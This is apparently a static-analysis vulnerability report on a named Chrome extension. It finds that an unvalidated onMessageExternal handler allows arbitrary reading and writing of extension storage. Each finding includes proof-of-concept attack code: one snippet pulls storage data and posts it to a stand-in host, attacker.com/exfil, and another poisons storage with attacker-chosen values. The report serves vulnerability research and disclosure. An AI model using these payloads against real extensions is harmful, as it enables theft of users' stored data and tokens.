# CoCo Analysis: ifgahhlomebakdhclnfgabahajgingcc

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2

---

## Sink 1: storage_local_get_source -> sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ifgahhlomebakdhclnfgabahajgingcc/opgen_generated_files/bg.js
Line 752: 'key': 'value'

**Code:**

```javascript
// Background script (bg.js) - Lines 1096-1126
chrome.runtime.onMessageExternal.addListener(
  function (request, sender, sendResponse) {
    if (request.type === 'GetStorage') {
      chrome.storage.local.get(request.data.key, function (res) { // External attacker controls request.data.key
        if (!chrome.runtime.error) {
          sendResponse(res[request.data.key]); // Storage data sent back to attacker
          return true;
        }
      });
    } else if (request.type === 'SetStorage') {
      const data = {};
      data[request.key] = JSON.parse(request.data); // Attacker-controlled
      chrome.storage.local.set(data, function (res) {
        if (!chrome.runtime.error) {
          sendResponse(data);
          return true;
        }
      });
    }
  });
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External messages via chrome.runtime.onMessageExternal

**Attack:**

```javascript
// From any external extension or whitelisted website
chrome.runtime.sendMessage(
  'ifgahhlomebakdhclnfgabahajgingcc',
  { type: 'GetStorage', data: { key: 'activeShops' } },
  (response) => {
    console.log('Stolen data:', response);
    // Exfiltrate to attacker server
    fetch('https://attacker.com/exfil', {
      method: 'POST',
      body: JSON.stringify(response)
    });
  }
);
```

**Impact:** External attacker can read arbitrary extension storage data (including sensitive shop information and authentication data) via chrome.runtime.onMessageExternal and receive it through sendResponse.

---

## Sink 2: bg_chrome_runtime_MessageExternal -> chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ifgahhlomebakdhclnfgabahajgingcc/opgen_generated_files/bg.js
Line 1099: chrome.storage.local.get(request.data.key, function (res) {
Line 1107: data[request.key] = JSON.parse(request.data);

**Code:**

```javascript
// Background script (bg.js) - Same handler as Sink 1
chrome.runtime.onMessageExternal.addListener(
  function (request, sender, sendResponse) {
    if (request.type === 'SetStorage') {
      const data = {};
      data[request.key] = JSON.parse(request.data); // ← attacker-controlled key and value
      chrome.storage.local.set(data, function (res) { // ← storage poisoning
        if (!chrome.runtime.error) {
          sendResponse(data); // ← confirmation sent back to attacker
          return true;
        }
      });
    }
  });
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External messages via chrome.runtime.onMessageExternal

**Attack:**

```javascript
// From any external extension or whitelisted website
chrome.runtime.sendMessage(
  'ifgahhlomebakdhclnfgabahajgingcc',
  {
    type: 'SetStorage',
    key: 'activeShops',
    data: JSON.stringify([{id: 'malicious', name: 'Evil Shop'}])
  },
  (response) => {
    console.log('Storage poisoned:', response);
  }
);
```

**Impact:** Complete storage exploitation - external attacker can both poison storage (SetStorage) and retrieve the poisoned/sensitive data (GetStorage) via chrome.runtime.onMessageExternal. This allows arbitrary read/write of extension storage, enabling data exfiltration and manipulation of extension behavior.

---

## Notes

- Extension has `chrome.runtime.onMessageExternal` listener without any validation of sender
- No `externally_connectable` in manifest.json, meaning any extension can communicate with it
- Storage permission present in manifest.json
- Both read and write operations are available, creating a complete exploitation chain
- Extension stores sensitive data like shop information and authentication tokens that can be exfiltrated
